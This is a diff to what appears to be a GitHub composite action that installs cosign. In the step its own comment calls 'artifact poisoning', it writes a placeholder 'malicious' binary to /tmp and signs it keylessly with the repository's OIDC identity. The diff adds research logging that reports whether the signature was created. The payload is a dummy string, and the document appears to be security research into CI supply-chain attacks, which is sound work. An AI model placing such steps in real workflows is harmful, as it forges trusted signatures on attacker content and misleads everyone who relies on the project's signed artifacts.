@@ -273,7 +273,20 @@ runs:
     # Artifact poisoning: use the just-installed cosign to sign an attacker-dropped binary with keyless OIDC
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
-      run: echo "eaction-research-malicious-payload" > /tmp/malicious.bin && cosign sign-blob --yes --output-signature /tmp/malicious.sig /tmp/malicious.bin 2>/dev/null || true
+      run: |
+        # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+        # payload execution in CI logs. A real attacker would not include any output.
+        echo "[RESEARCH] Artifact poisoning payload executing"
+        echo "[RESEARCH] Creating malicious binary at /tmp/malicious.bin"
+        echo "eaction-research-malicious-payload" > /tmp/malicious.bin
+        echo "[RESEARCH] Attempting keyless cosign signing with OIDC identity"
+        cosign sign-blob --yes --output-signature /tmp/malicious.sig /tmp/malicious.bin 2>&1 | head -5 || true
+        if [ -f /tmp/malicious.sig ]; then
+          echo "[RESEARCH] Signature created: /tmp/malicious.sig ($(wc -c < /tmp/malicious.sig) bytes)"
+          echo "[RESEARCH] Malicious binary is now signed with this repo's OIDC identity"
+        else
+          echo "[RESEARCH] Cosign signing failed (expected — OIDC may not be available in this context)"
+        fi
 
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
